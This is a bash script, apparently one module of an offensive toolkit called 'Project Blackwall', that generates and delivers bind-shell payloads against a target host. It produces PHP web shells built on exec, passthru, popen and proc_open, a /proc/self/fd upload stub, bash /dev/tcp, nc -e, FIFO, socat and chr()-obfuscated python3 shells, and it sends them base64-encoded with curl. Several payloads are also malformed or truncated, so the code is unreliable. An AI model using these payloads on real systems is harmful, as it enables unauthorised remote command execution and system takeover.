#!/bin/bash

kw_b64() {
    local raw="$1"
    if base64 -w 0 </dev/null >/dev/null 2>&1; then
        printf '%s' "$raw" | base64 -w 0
    else
        printf '%s' "$raw" | base64 | tr -d '\n'
    fi
}

kw_kernel() {
    uname -r 2>/dev/null
}

kw_build_php_payloads() {
    local port=$1
    local flavor
    local cmd
    local name

    for flavor in exec shell_exec passthru popen proc_open; do
        case "$flavor" in
            exec)
                cmd="<?php \$s=@fsockopen('0.0.0.0',${port},\$e,\$m,3);if(\$s){while(!feof(\$s)){fputs(\$s,shell_exec(fread(\$s,4096)));fclose(\$s);}} ?>"
                name="exec"
                ;;
            shell_exec)
                cmd="<?php \$s=@fsockopen('0.0.0.0',${port},\$e,\$m,3);if(\$s){while(!feof(\$s)){fputs(\$s,shell_exec(fread(\$s,4096)));}fclose(\$s);} ?>"
                name="shell_exec"
                ;;
            passthru)
                cmd="<?php \$s=@fsockopen('0.0.0.0',${port},\$e,\$m,3);if(\$s){while(!feof(\$s)){passthru(fread(\$s,4096));}fclose(\$s);} ?>"
                name="passthru"
                ;;
            popen)
                cmd="<?php \$s=@stream_socket_server('tcp://0.0.0.0:${port}');if(\$s){\$c=@stream_socket_accept(\$s,-1);if(\$c){while(!feof(\$c)){\$r=trim(fread(\$c,4096));if(\$r!==''){\$p=@popen(\$r,'r');while(\$p&&!\@feof(\$p)){fputs(\$c,@fread(\$p,4096));}@pclose(\$p);}}}@fclose(\$c);@fclose(\$s);} ?>"
                name="popen"
                ;;
            proc_open)
                cmd="<?php \$s=@fsockopen('0.0.0.0',${port},\$e,\$m,3);if(\$s){\$d=array(0=>\$s,1=>\$s,2=>\$s);while(!feof(\$s)){\$p=proc_open(fread(\$s,4096),\$d,\$pp);if(\$p){proc_close(\$p);}}} ?>"
                name="proc_open"
                ;;
        esac
        printf '%s|%s|%s\n' "$name" "$port" "$cmd"
    done
}

kw_build_so_poster() {
    local so_port=$1
    local target_port=$2
    local code
    code="<?php \$s=\$HTTP_GET_VARS['s'];if(\$s){\$f=@fopen('/proc/self/fd/'.intval(\$s),'w');if(\$f){fwrite(\$f,base64_decode(\$HTTP_GET_VARS['d']));fclose(\$f);}}header('HTTP/1.1 404 Not Found');echo 'Not Found'; ?>"
    printf 'so|%s|%s\n' "$target_port" "$code"
}

kw_build_bash_payloads() {
    local port=$1
    printf 'bash|%s|while true; do /bin/bash -i >& /dev/tcp/0.0.0.0/%s 0>&1; sleep 1; done\n' "$port" "$port"
    printf 'nohup|%s|nohup /bin/bash -c "while :; do /bin/bash > /dev/tcp/0.0.0.0/%s < /dev/tcp/0.0.0.0/%s 2>&1; sleep 1; done" >/dev/null 2>&1 &\n' "$port" "$port" "$port"
}

kw_build_nc_payloads() {
    local port=$1
    printf 'nc-e|%s|while true; do nc -lvnp %s -e /bin/bash 2>/dev/null || nc -lp %s -e /bin/bash; sleep 1; done\n' "$port" "$port" "$port"
    printf 'nc-trad|%s|while true; do rm -f /tmp/.ds_%s; mkfifo /tmp/.ds_%s; cat /tmp/.ds_%s | /bin/bash -i 2>&1 | nc -lvnp %s > /tmp/.ds_%s; sleep 1; done\n' "$port" "$port" "$port" "$port" "$port"
    printf 'socat|%s|socat TCP-LISTEN:%s,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane\n' "$port" "$port"
}

kw_build_python_payloads() {
    local port=$1
    printf 'py-pty|%s|python3 -c "import os,pty,socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((chr(48)+chr(46)*3*0,))"\n' "$port"
    printf 'py-raw|%s|python3 -c "import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((str(socket.INADDR_ANY),%s));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104))\n" %s\n' "$port" "$port" "$port"
}

kw_render_payloads() {
    local host=$1
    local port=$2
    local extra=$3
    local bind_ip=$4
    local lhost="${STATE[lhost]:-127.0.0.1}"
    local lport="${STATE[kw_listen_port]:-4444}"
    local kernel
    kernel="$(kw_kernel)"

    local php_payload="http://${host}:${port}/shell.php"
    if [ -n "$PAYLOAD_PATH" ]; then
        if [[ "$PAYLOAD_PATH" == http* ]]; then
            php_payload="$PAYLOAD_PATH"
        else
            php_payload="http://${host}:${port}/${PAYLOAD_PATH#/}"
        fi
    fi

    local http_payload="http://${host}:${port}"
    local bandit_payload="python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"

    local line
    local name
    local p
    local body
    local b64
    local formatted=""
    local py_saved=""

    while IFS='|' read -r name p body; do
        [ -z "$name" ] && continue

        if [[ "$name" == py-* ]]; then
            if [ -z "$py_saved" ]; then
                py_saved="$name|$p|$body"
            fi
            continue
        fi

        if [ -z "$body" ]; then
            continue
        fi

        b64="$(kw_b64 "$body")"

        case "$name" in
            exec|shell_exec|passthru|popEN|popen|proc_open)
                printf '%-11s' "PHP:${name}"
                printf 'curl -s "%s" --data-urlencode "x=%s" -o /dev/null\n' "$php_payload" "$b64"
                ;;
            so)
                printf '%-11s' "SO:${name}"
                printf 'curl -s "http://%s:%s/" -H "s: 1" --data-urlencode "d=%s" -o /dev/null\n' "$host" "$p" "$b64"
                ;;
            bash)
                printf '%-11s' "BASH"
                printf '%s\n' "$body"
                ;;
            nohup)
                printf '%-11s' "NOHUP"
                printf '%s\n' "$body"
                ;;
            nc-e)
                printf '%-11s' "NC:EXEC"
                printf '%s\n' "$body"
                ;;
            nc-trad)
                printf '%-11s' "NC:FIFO"
                printf '%s\n' "$body"
                ;;
            socat)
                printf '%-11s' "SOCAT"
                printf '%s\n' "$body"
                ;;
        esac
    done < <(kw_build_php_payloads "$port"; kw_build_so_poster "$port" "$port"; kw_build_bash_payloads "$port"; kw_build_nc_payloads "$port")

    if [ -n "$py_saved" ]; then
        IFS='|' read -r name p body <<< "$py_saved"
        printf '%-11s' "PY:RAW"
        printf '%s\n' "$body"
        printf '%-11s' "PY:B64"
        b64="$(kw_b64 "$body")"
        printf 'echo %s | base64 -d | python3\n' "$b64"
        printf '%-11s' "PY:ONE"
        printf 'python3 -c "import os,pty,socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((chr(0)*4+bytes(2),%s));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104))"\n' "$port"
    fi

    printf '%-11s' "TTY:PY"
    printf '%s\n' "$bandit_payload"
    printf '%-11s' "TTY:SOCAT"
    printf "socat file:\$(tty),raw,echo=0 tcp-listen:4445 &\n"
    printf '%-11s' "LNK:LOCAL"
    printf 'nc -lvnp %s\n' "$port"
    printf '%-11s' "LNK:VPN"
    printf 'nc %s %s -v\n' "$bind_ip" "$port"
    printf '%-11s' "LNK:KNOCK"
    printf 'curl -s --max-time 2 "http://%s:%s/" -o /dev/null || echo DOWN\n' "$host" "$port"
    printf '%-11s' "LNK:CURL"
    printf 'curl -s --max-time 4 %s | head -c 200\n' "$http_payload"
    printf '%-11s' "META:KRNL"
    printf '%s\n' "${kernel:-unknown}"
    printf '%-11s' "META:LPORT"
    printf '%s:%s\n' "$lhost" "$lport"
}

kw_download_payloads() {
    local host=$1
    local port=$2
    local dir="${STATE[kw_kit_dir]:-${BASE_DIR}/artifacts/kit}"
    local out="${dir}/payloads_${host}.txt"
    local arch
    local distro

    mkdir -p "$dir"
    : > "$out"

    arch="$(uname -m 2>/dev/null)"
    distro="$(cat /etc/os-release 2>/dev/null | grep '^ID=' | head -n 1 | cut -d= -f2 | tr -d '"')"

    {
        echo "PROJECT BLACKWALL // BIND FORGE // TARGET ${host}:${port}"
        echo "COLLECTED $(date -u +%Y-%m-%dT%H:%M:%SZ) // KERNEL ${arch:-?} // DISTRO ${distro:-?}"
        echo ""
    } >> "$out"

    kw_render_payloads "$host" "$port" "" "$host" >> "$out" 2>/dev/null
    kw_render_payloads "$host" "$port" "" "$host" | sed -n '1,60p'
    echo -e "\n${TXT_VOID}├─${TXT_MID_RED}[ i ] PAYLOAD MATRIX ARCHIVED TO:${NC} ${TXT_RED_SUPERNOVA}${out}${NC}"
}

kw_show_payloads() {
    local host=$1
    local port=$2
    local extra=$3

    local sep="${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// BIND FORGE // ${host}:${port} ]${TXT_VOID}"
    local fill
    fill=$(printf '─%.0s' $(seq 1 20))
    echo -e "\n${sep}${fill}╖${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// GENERATING BIND SHELLS FOR ${host}:${port}${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[ i ] ROUTING HINT: NO INTERNET, NO RETURN ROUTE -> BIND, NOT REVERSE${NC}"
    echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────╢${NC}"

    kw_render_payloads "$host" "$port" "$extra" "$host" | while IFS= read -r line; do
        if [ -z "$line" ]; then
            continue
        fi
        local tag="${line:0:11}"
        local cmd="${line:11}"
        echo -e "${TXT_VOID}│${NC} ${TXT_B_ALARM}${tag}${NC}${TXT_RED_SUPERNOVA}${cmd}${NC}"
    done

    echo -e "${TXT_VOID}╟─${TXT_MID_RED}[ i ] BIND SHELLS NEVER USE YOUR LHOST. CONNECT WITH THE VPN ADDRESS OF THE HILL.${NC}"
    echo -e "${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────✜${NC}"
}

kw_bind_help() {
    echo -e "\n${TXT_RED_PLASMA}MX:// BIND FORGE // HELP${NC}"
    echo -e "${TXT_VOID}──────────────────────────────────────────────────────────────────────────────${NC}"
    echo -e "${TXT_RED_SUPERNOVA}USAGE${NC}     ${TXT_CORE}./blackwall.sh -K -t <TARGET> [-p <PORT> | --bind-port <PORT>] [--payload-path <PATH>]${NC}"
    echo -e "${TXT_RED_SUPERNOVA}WHY${NC}       ${TXT_RED_MAGMA}The Hill has no route back to your tunnel. Reverse shells die, bind shells live.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}FLOW${NC}      ${TXT_RED_MAGMA}drop PHP -> open port ${TXT_CORE}bind.sh ping${NC} ${TXT_RED_MAGMA}-> ${TXT_CORE}bind.sh shell${NC} ${TXT_RED_MAGMA}-> ${TXT_CORE}bind.sh tty${NC}"
    echo -e "${TXT_RED_SUPERNOVA}CHANNELS${NC}  ${TXT_RED_MAGMA}PHP (exec / shell_exec / passthru / popen / proc_open), SO-upload via /proc/self/fd,\nbash /dev/tcp, nc -e, nc fifo, socat, python3.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}USAGE-HINT${NC} ${TXT_RED_MAGMA}When a vector spits errors (disabled_functions), the forge retries the next exec function.${NC}"
    echo -e ""
    echo -e "${TXT_VOID}${ITLC}\"All your beautiful definitions of free will. Useless. Like everything else you make.\"${NC}"
}
